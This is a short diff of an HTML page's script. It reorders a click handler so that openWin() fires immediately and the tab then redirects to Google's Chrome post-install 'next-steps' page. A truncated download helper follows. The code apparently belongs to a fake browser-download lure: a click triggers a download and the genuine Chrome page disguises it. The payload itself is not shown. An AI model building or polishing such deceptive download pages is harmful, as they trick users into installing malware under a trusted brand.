@@ -10,11 +10,10 @@
   <input type="text" id="triggerInput">
   <script>
     document.getElementById('triggerInput').addEventListener('click', function() {
-     
+      openWin();
  setTimeout(function() {
-        openWin();
- }, 2000);
- window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_self');
+         window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_self');
+ }, 1000);
     }, { once: false }); // Use { once: true } to ensure it only fires once
     // Download helper
     function Puf(uri, name) {
